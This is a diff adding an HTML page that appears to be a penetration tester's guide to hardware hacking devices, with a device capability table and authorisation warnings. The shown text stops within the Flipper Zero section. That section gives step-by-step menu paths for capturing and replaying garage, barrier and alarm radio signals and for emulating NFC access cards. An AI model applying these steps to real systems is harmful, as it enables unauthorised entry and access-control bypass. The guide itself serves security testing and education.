@@ -1,0 +1,873 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Cybersecurity Hardware Devices | Nisarg Chasmawala</title>
+<meta name="description" content="Cybersecurity Hardware Hacking Devices - the definitive guide by Nisarg Chasmawala (Shroff).">
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;600;700&display=swap" rel="stylesheet">
+<style>
+:root{--g:#00ff41;--c:#00e5ff;--p:#bf00ff;--r:#ff003c;--o:#ffd700;--bg:#030509;--t1:#d4ffe0;--t2:#7aad82;--t3:#2e4a32;--mono:'Share Tech Mono',monospace;--dsp:'Orbitron',sans-serif;--body:'Rajdhani',sans-serif;--glow:0 0 20px rgba(0,255,65,.4),0 0 60px rgba(0,255,65,.15);--cglow:0 0 20px rgba(0,229,255,.4),0 0 60px rgba(0,229,255,.1);--pglow:0 0 20px rgba(191,0,255,.4),0 0 60px rgba(191,0,255,.1)}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;overflow-x:hidden}
+body{background:var(--bg);color:var(--t1);font-family:var(--body);font-size:17px;line-height:1.8;overflow-x:hidden;cursor:none}
+#bg-particle{position:fixed;inset:0;z-index:0;pointer-events:none}
+#bg-hex{position:fixed;inset:0;z-index:0;pointer-events:none;opacity:.35}
+#bg-scan{position:fixed;inset:0;z-index:9999;pointer-events:none;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,65,.009) 2px,rgba(0,255,65,.009) 4px)}
+#bg-vignette{position:fixed;inset:0;z-index:1;pointer-events:none;background:radial-gradient(ellipse at 50% 50%,transparent 50%,rgba(3,5,9,.85) 100%)}
+#cur{position:fixed;width:10px;height:10px;border-radius:50%;background:var(--g);box-shadow:var(--glow);pointer-events:none;z-index:99999;transform:translate(-50%,-50%);transition:width .1s,height .1s}
+#cur2{position:fixed;width:30px;height:30px;border-radius:50%;border:1px solid rgba(0,255,65,.5);pointer-events:none;z-index:99998;transform:translate(-50%,-50%)}
+#cur3{position:fixed;width:50px;height:50px;border-radius:50%;border:1px solid rgba(0,255,65,.2);pointer-events:none;z-index:99997;transform:translate(-50%,-50%)}
+#prog{position:fixed;top:0;left:0;height:2px;background:linear-gradient(to right,var(--g),var(--c),var(--p));box-shadow:0 0 10px var(--g);z-index:10000;width:0%}
+.topbar{position:fixed;top:0;left:0;right:0;height:58px;background:rgba(3,5,9,.88);border-bottom:1px solid rgba(0,255,65,.12);backdrop-filter:blur(20px);z-index:1000;display:flex;align-items:center;justify-content:space-between;padding:0 32px}
+.tb-left{display:flex;flex-direction:column;gap:2px}
+.tb-name{font-family:var(--dsp);font-size:13px;font-weight:900;color:var(--t1);letter-spacing:3px}
+.tb-roles{font-family:var(--mono);font-size:9px;overflow:hidden;white-space:nowrap}
+.tb-inner{display:inline-block;color:var(--c);animation:ticker 18s linear infinite}
+@keyframes ticker{0%{transform:translateX(100%)}100%{transform:translateX(-100%)}}
+.tb-status{display:flex;align-items:center;gap:8px;font-family:var(--mono);font-size:11px;color:var(--g)}
+.tb-dot{width:7px;height:7px;border-radius:50%;background:var(--g);box-shadow:0 0 10px var(--g);animation:tdot 1.2s ease-in-out infinite}
+@keyframes tdot{0%,100%{opacity:1}50%{opacity:.3}}
+.toc{position:fixed;right:20px;top:50%;transform:translateY(-50%);z-index:200;display:flex;flex-direction:column;gap:9px}
+.toc-i{display:flex;align-items:center;gap:8px;cursor:pointer}
+.toc-d{width:6px;height:6px;border-radius:50%;border:1px solid var(--t3);transition:all .25s;flex-shrink:0}
+.toc-i.active .toc-d,.toc-i:hover .toc-d{background:var(--g);border-color:var(--g);box-shadow:0 0 10px var(--g)}
+.toc-l{font-family:var(--mono);font-size:10px;color:var(--t3);opacity:0;transform:translateX(6px);transition:all .2s;white-space:nowrap}
+.toc-i:hover .toc-l,.toc-i.active .toc-l{opacity:1;transform:none;color:var(--g)}
+@media(max-width:1000px){.toc{display:none}}
+.wrap{position:relative;z-index:10;max-width:980px;margin:0 auto;padding:0 28px}
+.hero{min-height:100vh;display:flex;flex-direction:column;justify-content:center;padding:100px 0 60px;position:relative}
+.hero-canvas-wrap{position:absolute;right:-60px;top:50%;transform:translateY(-52%);width:420px;height:420px;pointer-events:none}
+#hero-geo{width:100%;height:100%}
+.hero-content{max-width:520px;position:relative;z-index:2}
+.hero-tag{font-family:var(--mono);font-size:11px;letter-spacing:4px;color:var(--c);text-transform:uppercase;margin-bottom:18px;opacity:0;animation:fup .6s ease forwards .3s;display:flex;align-items:center;gap:12px}
+.hero-tag::before{content:'';width:40px;height:1px;background:linear-gradient(to right,transparent,var(--c))}
+.hero-tag::after{content:'';flex:1;max-width:100px;height:1px;background:linear-gradient(to right,var(--c),transparent)}
+.hero-title{font-family:var(--dsp);font-size:clamp(15px,2.8vw,36px);font-weight:900;line-height:1.05;letter-spacing:2px;text-transform:uppercase;margin-bottom:8px;opacity:0;animation:fup .7s ease forwards .5s}
+.ht-line1{display:block;color:var(--g);text-shadow:0 0 40px rgba(0,255,65,.6)}
+.ht-sub{display:block;font-size:.43em;letter-spacing:4px;color:rgba(200,255,220,.5);font-weight:400;margin-top:10px}
+.gw{position:relative;display:inline-block}
+.gw::before,.gw::after{content:attr(data-t);position:absolute;top:0;left:0;width:100%;font-family:var(--dsp);font-weight:900;font-size:inherit;letter-spacing:inherit;text-transform:uppercase}
+.gw::before{color:var(--c);animation:ga 5s infinite;clip-path:polygon(0 0,100% 0,100% 33%,0 33%)}
+.gw::after{color:var(--r);animation:gb 5s infinite;clip-path:polygon(0 66%,100% 66%,100% 100%,0 100%)}
+@keyframes ga{0%,85%,100%{transform:none;opacity:0}87%{transform:translate(-5px,2px);opacity:.9}93%{transform:none;opacity:0}}
+@keyframes gb{0%,87%,100%{transform:none;opacity:0}89%{transform:translate(5px,3px);opacity:.8}95%{transform:none;opacity:0}}
+.hero-desc{font-size:17px;font-weight:300;color:var(--t2);max-width:560px;line-height:1.75;margin-bottom:36px;opacity:0;animation:fup .8s ease forwards .8s;margin-top:20px}
+.hero-meta{display:flex;gap:24px;flex-wrap:wrap;opacity:0;animation:fup .8s ease forwards 1s}
+.m-item{display:flex;flex-direction:column;gap:3px}
+.m-lbl{font-family:var(--mono);font-size:9px;letter-spacing:3px;color:var(--t3);text-transform:uppercase}
+.m-val{font-family:var(--mono);font-size:12px;color:var(--c)}
+.hero-scroll-hint{position:absolute;bottom:24px;left:0;display:flex;align-items:center;gap:12px;opacity:0;animation:fin 1s ease forwards 1.8s}
+.hs-line{width:60px;height:1px;background:linear-gradient(to right,var(--g),transparent)}
+.hs-txt{font-family:var(--mono);font-size:9px;letter-spacing:3px;color:var(--t3)}
+.hs-pulse{width:6px;height:6px;border-radius:50%;background:var(--g);box-shadow:0 0 8px var(--g);animation:tdot 1.5s ease-in-out infinite}
+.sec{margin-bottom:100px}
+.sec-hd{display:flex;align-items:center;gap:14px;margin-bottom:40px}
+.sec-n{font-family:var(--mono);font-size:10px;color:var(--p);letter-spacing:2px;min-width:44px}
+.sec-ln{flex:1;height:1px;background:linear-gradient(to right,rgba(0,229,255,.35),transparent)}
+.sec-t{font-family:var(--dsp);font-size:clamp(14px,2.4vw,21px);font-weight:700;letter-spacing:3px;text-transform:uppercase;color:var(--c);text-shadow:var(--cglow)}
+.tw-cursor{display:inline-block;width:2px;height:1em;background:var(--c);margin-left:4px;animation:blink 1s step-end infinite;vertical-align:middle}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
+.sec-ai .sec-t{color:#bf00ff;text-shadow:var(--pglow)}
+.sec-ai .sec-n{color:var(--c)}
+.sec-ai .sec-ln{background:linear-gradient(to right,rgba(191,0,255,.35),transparent)}
+.sec-ai .tw-cursor{background:#bf00ff}
+.panel{background:rgba(0,255,65,.025);border:1px solid rgba(0,255,65,.12);border-radius:4px;padding:32px;margin-bottom:22px;position:relative;overflow:hidden;transition:border-color .3s,box-shadow .3s,transform .3s}
+.panel::before{content:'';position:absolute;top:0;left:0;width:3px;height:100%;background:linear-gradient(to bottom,var(--g),transparent);opacity:0;transition:opacity .3s}
+.panel:hover{border-color:rgba(0,229,255,.4);box-shadow:0 0 50px rgba(0,229,255,.07),0 20px 60px rgba(0,0,0,.3);transform:translateY(-3px)}
+.panel:hover::before{opacity:1}
+.panel p{color:var(--t2);margin-bottom:12px}
+.panel p:last-child{margin-bottom:0}
+.panel-t{font-family:var(--dsp);font-size:12px;font-weight:700;letter-spacing:3px;color:var(--g);text-transform:uppercase;margin-bottom:18px;display:flex;align-items:center;gap:12px}
+.panel-t::after{content:'';flex:1;height:1px;background:linear-gradient(to right,rgba(0,255,65,.2),transparent)}
+.panel-ai{background:rgba(191,0,255,.03);border-color:rgba(191,0,255,.18)}
+.panel-ai:hover{border-color:rgba(191,0,255,.45)}
+.panel-ai .panel-t{color:#bf00ff}
+.panel-ai .panel-t::after{background:linear-gradient(to right,rgba(191,0,255,.2),transparent)}
+.panel-ai::before{background:linear(to bottom,#bf00ff,transparent)}
+.ai-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(270px,1fr));gap:16px;margin:20px 0}
+.ai-card{background:rgba(191,0,255,.04);border:1px solid rgba(191,0,255,.18);border-radius:4px;padding:22px;position:relative;overflow:hidden;transition:all .3s}
+.ai-card::after{content:'';position:absolute;top:0;right:0;width:0;height:0;border-top:26px solid rgba(191,0,255,.25);border-left:26px solid transparent}
+.ai-card:hover{border-color:rgba(191,0,255,.5);box-shadow:var(--pglow),0 16px 40px rgba(0,0,0,.25);transform:translateY(-3px)}
+.ai-ico{font-size:24px;margin-bottom:10px;display:block}
+.ai-name{font-family:var(--dsp);font-size:11px;font-weight:700;letter-spacing:2px;color:#bf00ff;text-transform:uppercase;margin-bottom:10px}
+.ai-desc{font-size:14px;color:var(--t2);line-height:1.65;font-weight:300}
+.alert{border-radius:4px;padding:16px 20px;margin:20px 0;display:flex;gap:14px;align-items:flex-start}
+.al-w{background:rgba(255,215,0,.04);border:1px solid rgba(255,215,0,.18);border-left:3px solid var(--o)}
+.al-p{background:rgba(191,0,255,.04);border:1px solid rgba(191,0,255,.18);border-left:3px solid #bf00ff}
+.al-i{background:rgba(0,229,255,.04);border:1px solid rgba(0,229,255,.14);border-left:3px solid var(--c)}
+.al-ic{font-family:var(--mono);font-size:13px;flex-shrink:0;margin-top:2px}
+.al-w .al-ic{color:var(--o)}.al-p .al-ic{color:#bf00ff}.al-i .al-ic{color:var(--c)}
+.al-tx{font-size:14px;color:var(--t2);line-height:1.6}
+.ptbl{width:100%;border-collapse:collapse;font-family:var(--mono);font-size:12px;margin:16px 0}
+.ptbl th{text-align:left;padding:11px 14px;color:var(--c);border-bottom:1px solid rgba(0,229,255,.3);letter-spacing:2px;font-size:10px;text-transform:uppercase}
+.ptbl td{padding:10px 14px;color:var(--t2);border-bottom:1px solid rgba(0,255,65,.05);vertical-align:top}
+.ptbl tr:hover td{background:rgba(0,255,65,.02)}
+.ptbl td:first-child{color:var(--g);font-weight:700}
+.cb{background:rgba(0,0,0,.7);border:1px solid rgba(0,255,65,.1);border-left:3px solid var(--g);border-radius:0 4px 4px 0;padding:22px 26px;margin:16px 0;position:relative;overflow-x:auto;cursor:pointer;transition:all .3s}
+.cb::before{content:attr(data-l);position:absolute;top:0;right:0;font-family:var(--mono);font-size:9px;letter-spacing:2px;color:var(--g);background:rgba(0,255,65,.07);padding:3px 12px;border-bottom-left-radius:4px;text-transform:uppercase}
+.cb:hover{border-color:rgba(0,255,65,.35)}
+.cb.cb-ai{border-left-color:#bf00ff}.cb.cb-ai::before{color:#bf00ff;background:rgba(191,0,255,.07)}
+.cb code{font-family:var(--mono);font-size:13px;color:var(--g);white-space:pre;display:block;line-height:1.9}
+.dev-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:18px;margin:24px 0}
+.dev-card{background:rgba(0,0,0,.45);border:1px solid rgba(0,229,255,.15);border-radius:4px;padding:22px;position:relative;overflow:hidden;transition:all .3s}
+.dev-card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(to right,var(--c),transparent);opacity:.5}
+.dev-card:hover{border-color:rgba(0,229,255,.45);transform:translateY(-3px);box-shadow:var(--cglow)}
+.dev-ico{font-size:28px;margin-bottom:10px;display:block}
+.dev-name{font-family:var(--dsp);font-size:12px;font-weight:700;letter-spacing:2px;color:var(--c);text-transform:uppercase;margin-bottom:4px}
+.dev-tag{font-family:var(--mono);font-size:9px;letter-spacing:2px;color:var(--o);text-transform:uppercase;margin-bottom:10px;display:block}
+.dev-desc{font-size:13px;color:var(--t2);line-height:1.55}
+.spec-row{display:flex;justify-content:space-between;align-items:baseline;border-bottom:1px solid rgba(0,255,65,.06);padding:6px 0}
+.spec-row:last-child{border-bottom:none}
+.spec-k{font-family:var(--mono);font-size:11px;color:var(--t3)}
+.spec-v{font-family:var(--mono);font-size:11px;color:var(--g)}
+.cta{background:linear-gradient(135deg,rgba(0,255,65,.04),rgba(191,0,255,.04));border:1px solid rgba(0,229,255,.3);border-radius:4px;padding:60px 50px;text-align:center;position:relative;overflow:hidden;margin-top:80px}
+.cta::before{content:'HACK';position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);font-family:var(--dsp);font-size:200px;font-weight:900;color:rgba(0,255,65,.018);pointer-events:none;letter-spacing:16px}
+.cta-t{font-family:var(--dsp);font-size:20px;font-weight:700;letter-spacing:4px;color:var(--g);text-transform:uppercase;margin-bottom:16px;text-shadow:var(--glow)}
+.cta-p{color:var(--t2);font-size:16px;max-width:540px;margin:0 auto 32px;line-height:1.75}
+.cta-btns{display:flex;gap:16px;justify-content:center;flex-wrap:wrap}
+.btn{font-family:var(--mono);font-size:11px;letter-spacing:3px;text-transform:uppercase;padding:13px 30px;border-radius:2px;text-decoration:none;display:inline-block;transition:all .25s}
+.btn-p{border:1px solid var(--g);color:var(--g);background:rgba(0,255,65,.06)}
+.btn-p:hover{background:var(--g);color:var(--bg);box-shadow:var(--glow)}
+.btn-s{border:1px solid var(--c);color:var(--c);background:rgba(0,229,255,.05)}
+.btn-s:hover{background:var(--c);color:var(--bg);box-shadow:var(--cglow)}
+.footer{border-top:1px solid rgba(0,255,65,.1);padding:32px 0;margin-top:60px;display:flex;align-items:flex-start;justify-content:space-between;flex-wrap:wrap;gap:20px}
+.f-l{font-family:var(--mono);font-size:11px;color:var(--t3);letter-spacing:1.5px;line-height:2}
+.f-alias{color:var(--g);font-size:10px;letter-spacing:3px;text-shadow:0 0 8px var(--g)}
+.f-r{font-family:var(--mono);font-size:11px;color:var(--t3);text-align:right;line-height:2}
+.f-r a{color:var(--g);text-decoration:none}
+.f-r a:hover{text-shadow:var(--glow)}
+.div{height:1px;background:linear-gradient(to right,transparent,rgba(0,255,65,.15),transparent);margin:60px 0;position:relative}
+.div::after{content:'';position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:6px;height:6px;border-radius:50%;background:var(--g);box-shadow:0 0 12px var(--g)}
+.div-ai{background:linear-gradient(to right,transparent,rgba(191,0,255,.22),transparent)}
+.div-ai::after{background:#bf00ff;box-shadow:0 0 12px #bf00ff}
+@keyframes fup{from{opacity:0;transform:translateY(24px)}to{opacity:1;transform:none}}
+@keyframes fin{from{opacity:0}to{opacity:1}}
+.rv{opacity:0;transform:translateY(30px);transition:opacity .8s,transform .8s}
+.rv-l{opacity:0;transform:translateX(-30px);transition:opacity .8s,transform .8s}
+.rv.on,.rv-l.on{opacity:1;transform:none}
+@media(max-width:700px){.ai-grid,.dev-grid{grid-template-columns:1fr}.hero-canvas-wrap{display:none}.cta{padding:36px 20px}}
+
+.attack-card{background:rgba(0,0,0,.5);border:1px solid rgba(0,229,255,.15);border-radius:4px;padding:18px;margin-bottom:12px;transition:all .3s}
+.attack-card:hover{border-color:rgba(0,229,255,.4);transform:translateX(4px)}
+.attack-card-hd{display:flex;align-items:center;gap:12px;margin-bottom:8px}
+.attack-ico{font-size:18px;flex-shrink:0}
+.attack-name{font-family:var(--mono);font-size:12px;color:var(--c);font-weight:700;letter-spacing:1px}
+.attack-tag{font-family:var(--mono);font-size:9px;letter-spacing:2px;color:var(--o);text-transform:uppercase;margin-left:auto}
+.attack-desc{font-size:13px;color:var(--t2);line-height:1.55}
+.attack-code{font-family:var(--mono);font-size:11px;color:var(--g);background:rgba(0,255,65,.05);border:1px solid rgba(0,255,65,.12);border-radius:3px;padding:8px 12px;margin-top:8px;display:block;line-height:1.7}
+.addon-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:14px;margin:20px 0}
+.addon-card{background:rgba(255,215,0,.03);border:1px solid rgba(255,215,0,.15);border-radius:4px;padding:18px;position:relative;overflow:hidden;transition:all .3s}
+.addon-card::after{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(to right,var(--o),transparent);opacity:.6}
+.addon-card:hover{border-color:rgba(255,215,0,.4);transform:translateY(-3px);box-shadow:0 0 20px rgba(255,215,0,.1)}
+.addon-name{font-family:var(--mono);font-size:12px;color:var(--o);font-weight:700;margin-bottom:4px}
+.addon-type{font-family:var(--mono);font-size:9px;letter-spacing:2px;color:var(--t3);text-transform:uppercase;margin-bottom:8px;display:block}
+.addon-desc{font-size:12px;color:var(--t2);line-height:1.5}
+.spec-panel{background:rgba(0,0,0,.45);border:1px solid rgba(0,229,255,.12);border-radius:4px;padding:20px;margin-bottom:16px}
+.spec-panel-t{font-family:var(--mono);font-size:10px;letter-spacing:3px;color:var(--c);text-transform:uppercase;margin-bottom:14px;display:flex;align-items:center;gap:10px}
+.spec-panel-t::after{content:'';flex:1;height:1px;background:linear-gradient(to right,rgba(0,229,255,.2),transparent)}
+.spec-row{display:flex;justify-content:space-between;align-items:baseline;border-bottom:1px solid rgba(0,255,65,.05);padding:7px 0}
+.spec-row:last-child{border-bottom:none}
+.spec-k{font-family:var(--mono);font-size:11px;color:var(--t3)}
+.spec-v{font-family:var(--mono);font-size:11px;color:var(--g)}
+.flow-grid{display:flex;flex-direction:column;gap:0;margin:20px 0}
+.flow-step{display:flex;gap:16px;position:relative}
+.flow-step::before{content:'';position:absolute;left:19px;top:38px;bottom:-14px;width:2px;background:linear-gradient(to bottom,rgba(0,255,65,.3),rgba(0,255,65,.05))}
+.flow-step:last-child::before{display:none}
+.flow-num{width:38px;height:38px;border-radius:50%;border:2px solid var(--g);display:flex;align-items:center;justify-content:center;font-family:var(--dsp);font-size:13px;font-weight:900;color:var(--g);flex-shrink:0;background:var(--bg);box-shadow:0 0 14px rgba(0,255,65,.2);margin-top:2px}
+.flow-body{flex:1;padding-bottom:24px}
+.flow-title{font-family:var(--mono);font-size:12px;color:var(--c);letter-spacing:2px;font-weight:700;margin-bottom:4px}
+.flow-desc{font-size:14px;color:var(--t2);line-height:1.6}
+.flow-device{font-family:var(--mono);font-size:10px;color:var(--o);margin-top:5px;letter-spacing:1px}
+.card-2col{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin:20px 0}
+@media(max-width:600px){.card-2col{grid-template-columns:1fr}}
+</style>
+</head>
+<body>
+<canvas id="bg-particle"></canvas>
+<canvas id="bg-hex"></canvas>
+<div id="bg-vignette"></div>
+<div id="bg-scan"></div>
+<div id="cur"></div><div id="cur2"></div><div id="cur3"></div>
+<div id="prog"></div>
+<nav class="topbar">
+  <div class="tb-left">
+    <span class="tb-name">NISARG CHASMAWALA (SHROFF)</span>
+    <div class="tb-roles"><span class="tb-inner">Penetration Tester &nbsp;|&nbsp; Vulnerability Assessment &nbsp;|&nbsp; Cybersecurity Researcher &nbsp;|&nbsp; Offensive Security Engineer &nbsp;|&nbsp; Digital Forensics &nbsp;|&nbsp; Red Team &nbsp;|&nbsp; Hardware Hacking</span></div>
+  </div>
+  <div class="tb-status"><span class="tb-dot"></span>SYS ONLINE</div>
+</nav>
+<nav class="toc" id="toc">
+  <div class="toc-i active" onclick="goTo('#hero')" data-s="hero"><div class="toc-d"></div><span class="toc-l">INTRO</span></div>
+  <div class="toc-i" onclick="goTo('#overview')" data-s="overview"><div class="toc-d"></div><span class="toc-l">OVERVIEW</span></div>
+  <div class="toc-i" onclick="goTo('#flipper')" data-s="flipper"><div class="toc-d"></div><span class="toc-l">FLIPPER ZERO</span></div>
+  <div class="toc-i" onclick="goTo('#usb')" data-s="usb"><div class="toc-d"></div><span class="toc-l">BAD USB &amp; O.MG</span></div>
+  <div class="toc-i" onclick="goTo('#hak5')" data-s="hak5"><div class="toc-d"></div><span class="toc-l">HAK5 ARSENAL</span></div>
+  <div class="toc-i" onclick="goTo('#wifi')" data-s="wifi"><div class="toc-d"></div><span class="toc-l">WI-FI DEVICES</span></div>
+  <div class="toc-i" onclick="goTo('#rfid')" data-s="rfid"><div class="toc-d"></div><span class="toc-l">PROXMARK3</span></div>
+  <div class="toc-i" onclick="goTo('#workflows')" data-s="workflows"><div class="toc-d"></div><span class="toc-l">WORKFLOWS</span></div>
+  <div class="toc-i" onclick="goTo('#ai')" data-s="ai"><div class="toc-d"></div><span class="toc-l">AI INTEGRATION</span></div>
+</nav>
+<div class="wrap">
+
+<section class="hero" id="hero">
+  <div class="hero-canvas-wrap"><canvas id="hero-geo"></canvas></div>
+  <div class="hero-content">
+  <div class="hero-tag">NISARG CHASMAWALA &nbsp;//&nbsp; ALIAS: HEAVEN</div>
+  <h1 class="hero-title">
+    <div class="gw" data-t="HACK HARDWARE"><span class="ht-line1">HACK HARDWARE</span></div>
+    <span class="ht-sub">FLIPPER &middot; HAK5 &middot; O.MG &middot; PROXMARK &middot; AI</span>
+  </h1>
+  <p class="hero-desc">The definitive field guide to cybersecurity hardware hacking devices. From the Flipper Zero and O.MG Cable to the complete Hak5 arsenal, Wi-Fi adapters and Pineapple, and the Proxmark3 RDV4. Every professional red team operator's hardware toolkit -- covering capabilities, attack workflows, firmware, payloads, and AI-enhanced operational intelligence. For authorised penetration testing and security research only.</p>
+  <div class="hero-meta">
+    <div class="m-item"><span class="m-lbl">Author</span><span class="m-val">Nisarg Chasmawala (Shroff)</span></div>
+    <div class="m-item"><span class="m-lbl">Alias</span><span class="m-val">HEAVEN</span></div>
+    <div class="m-item"><span class="m-lbl">Category</span><span class="m-val">Hardware &middot; Red Team &middot; AI</span></div>
+    <div class="m-item"><span class="m-lbl">Certs</span><span class="m-val">CEH Master &middot; CPENT &middot; CHFI</span></div>
+  </div>
+  </div>
+  <div class="hero-scroll-hint"><div class="hs-line"></div><span class="hs-txt">SCROLL TO BEGIN</span><div class="hs-pulse"></div></div>
+</section>
+<div class="div"></div>
+
+<!-- 01 OVERVIEW -->
+<section class="sec rv" id="overview">
+  <div class="sec-hd"><span class="sec-n">01 //</span><h2 class="sec-t">Hardware Hacking Device Ecosystem<span class="tw-cursor"></span></h2><div class="sec-ln"></div></div>
+  <div class="panel rv-l">
+    <p><strong style="color:var(--t1)">Hardware hacking devices</strong> are purpose-built tools that give penetration testers physical-layer attack capabilities that software alone cannot provide. They interact directly with hardware interfaces -- USB HID emulation, sub-GHz radio, NFC/RFID, IR, Wi-Fi, Ethernet -- performing attacks that bypass network-layer security controls entirely. A red team kit equipped with these devices can compromise an organisation through physical access, rogue wireless infrastructure, credential harvesting, and lateral movement before a single network packet is logged by a SIEM.</p>
+    <p>These devices are used in authorised physical penetration tests, red team engagements, hardware security research, and security awareness demonstrations. They are not toys -- every device in this guide can cause significant security impact in the wrong hands. Always obtain written authorisation before deploying any of these tools in an operational environment.</p>
+  </div>
+  <div class="alert al-w rv">
+    <span class="al-ic">[ ! ]</span>
+    <p class="al-tx"><strong>Authorised Engagements Only.</strong> Deploying HID injection, rogue Wi-Fi, or RFID cloning devices against targets without explicit written authorisation violates the Computer Misuse Act, CFAA, and equivalent global laws. Use only in isolated lab environments, your own equipment, or targets with documented written scope and authorisation.</p>
+  </div>
+  <div class="panel rv">
+    <div class="panel-t">Hardware Device Capability Matrix</div>
+    <table class="ptbl">
+      <thead><tr><th>Device</th><th>Primary Vector</th><th>Interface</th><th>Skill Level</th><th>Price Range</th></tr></thead>
+      <tbody>
+        <tr><td>Flipper Zero</td><td>Sub-GHz, NFC, IR, iButton, BadUSB</td><td>Multi-protocol</td><td>Beginner-Pro</td><td>~$170</td></tr>
+        <tr><td>USB Rubber Ducky</td><td>HID injection (keystroke)</td><td>USB-A</td><td>Beginner</td><td>~$80</td></tr>
+        <tr><td>Bash Bunny</td><td>HID + network + storage</td><td>USB-A</td><td>Intermediate</td><td>~$120</td></tr>
+        <tr><td>O.MG Cable</td><td>HID + Wi-Fi C2 (disguised as cable)</td><td>USB-C/A/Lightning</td><td>Intermediate</td><td>~$180</td></tr>
+        <tr><td>Bad USB</td><td>HID injection (custom firmware)</td><td>USB-A/C</td><td>Beginner</td><td>~$5-50</td></tr>
+        <tr><td>Wi-Fi Pineapple</td><td>Rogue AP, MITM, portal capture</td><td>Wi-Fi 2.4/5 GHz</td><td>Intermediate</td><td>~$200</td></tr>
+        <tr><td>LAN Turtle</td><td>Network tap, pivot, C2 relay</td><td>Ethernet USB</td><td>Intermediate</td><td>~$80</td></tr>
+        <tr><td>Wi-Fi Adapter (Alfa)</td><td>Monitor mode, injection, attacks</td><td>USB Wi-Fi</td><td>Intermediate</td><td>~$30-80</td></tr>
+        <tr><td>Proxmark3 RDV4</td><td>RFID/NFC clone, emulate, crack</td><td>RFID 125kHz/13.56MHz</td><td>Advanced</td><td>~$300</td></tr>
+      </tbody>
+    </table>
+  </div>
+</section>
+<div class="div"></div>
+
+<!-- 02 FLIPPER ZERO -->
+<section class="sec rv" id="flipper">
+  <div class="sec-hd"><span class="sec-n">02 //</span><h2 class="sec-t">Flipper Zero -- The Swiss Army Knife<span class="tw-cursor"></span></h2><div class="sec-ln"></div></div>
+  <div class="panel rv-l">
+    <p><strong style="color:var(--c)">Flipper Zero</strong> is the most versatile portable hacking device ever made -- a pocket-sized multi-protocol tool combining Sub-GHz radio (300-928 MHz), NFC (13.56 MHz), 125 kHz RFID, infrared transceiver, iButton/1-Wire, GPIO pins, and a BadUSB engine in one dolphin-branded device. Community firmware like <strong style="color:var(--g)">Unleashed</strong> and <strong style="color:var(--g)">RogueMaster</strong> unlock additional frequencies, plugins, and protocols beyond the stock firmware restrictions.</p>
+  </div>
+  <div class="card-2col rv">
+    <div class="spec-panel">
+      <div class="spec-panel-t">Hardware Specs</div>
+      <div class="spec-row"><span class="spec-k">CPU</span><span class="spec-v">STM32WB55 (ARM Cortex-M4 + M0+)</span></div>
+      <div class="spec-row"><span class="spec-k">Sub-GHz</span><span class="spec-v">CC1101 · 300-928 MHz</span></div>
+      <div class="spec-row"><span class="spec-k">NFC/RFID</span><span class="spec-v">ST25R3916 · 13.56 MHz + 125 kHz</span></div>
+      <div class="spec-row"><span class="spec-k">IR</span><span class="spec-v">TX/RX · 850nm transceiver</span></div>
+      <div class="spec-row"><span class="spec-k">BLE</span><span class="spec-v">Bluetooth 5.0 LE</span></div>
+      <div class="spec-row"><span class="spec-k">GPIO</span><span class="spec-v">18 pins · UART, SPI, I2C, 1-Wire</span></div>
+      <div class="spec-row"><span class="spec-k">Battery</span><span class="spec-v">2000 mAh · ~30h typical use</span></div>
+      <div class="spec-row"><span class="spec-k">Storage</span><span class="spec-v">MicroSD slot (FAT32, up to 64GB)</span></div>
+    </div>
+    <div class="spec-panel">
+      <div class="spec-panel-t">Firmware Options</div>
+      <div class="spec-row"><span class="spec-k">Official</span><span class="spec-v">flipper.net/update</span></div>
+      <div class="spec-row"><span class="spec-k">Unleashed</span><span class="spec-v">Extra Sub-GHz + rolling codes</span></div>
+      <div class="spec-row"><span class="spec-k">RogueMaster</span><span class="spec-v">All plugins + extra protocols</span></div>
+      <div class="spec-row"><span class="spec-k">Flash method</span><span class="spec-v">qFlipper app via USB-C</span></div>
+      <div class="spec-row"><span class="spec-k">DFU mode</span><span class="spec-v">Left + Back buttons held</span></div>
+      <div class="spec-row"><span class="spec-k">Update OTA</span><span class="spec-v">Via mobile app (Flipper Mobile)</span></div>
+      <div class="spec-row"><span class="spec-k">SD content</span><span class="spec-v">Signals, databases, plugins, scripts</span></div>
+      <div class="spec-row"><span class="spec-k">Community</span><span class="spec-v">github.com/flipperdevices</span></div>
+    </div>
+  </div>
+  <div class="attack-card rv">
+    <div class="attack-card-hd"><span class="attack-ico">&#128268;</span><div class="attack-name">Sub-GHz Signal Capture &amp; Replay</div><span class="attack-tag">315/433/868/915 MHz</span></div>
+    <div class="attack-desc">Navigate to <strong style="color:var(--c)">Sub-GHz &rarr; Frequency Analyser</strong> to scan the RF environment and identify active transmitters. Press <strong>Read RAW</strong> pointed at a garage remote, barrier fob, or alarm sensor to capture the signal waveform. Navigate to <strong>Saved &rarr; Send</strong> to replay. Unleashed firmware adds support for additional modulations and removes frequency restrictions, enabling capture on previously locked bands.</div>
+    <span class="attack-code">Sub-GHz → Read RAW → capture → Saved → Send → replay to target receiver</span>
+  </div>
+  <div class="attack-card rv">
+    <div class="attack-card-hd"><span class="attack-ico">&#128274;</span><div class="attack-name">NFC Card Read, Save &amp; Emulation</div><span class="attack-tag">13.56 MHz · MIFARE · NTAG</span></div>
+    <div class="attack-desc">Navigate to <strong style="color:var(--c)">NFC &rarr; Read</strong> to identify and dump NFC cards within range. Supports MIFARE Classic (with partial key recovery), MIFARE Ultralight, NTAG21x, and EMV bank cards. Use <strong>Saved &rarr; Emulate</strong> to present the saved card data to an NFC reader -- works for most MIFARE Ultralight and NTAG-based access systems. MIFARE Classic emulation has limitations due to CRYPTO1 -- for full clone use Proxmark3 RDV4.</div>
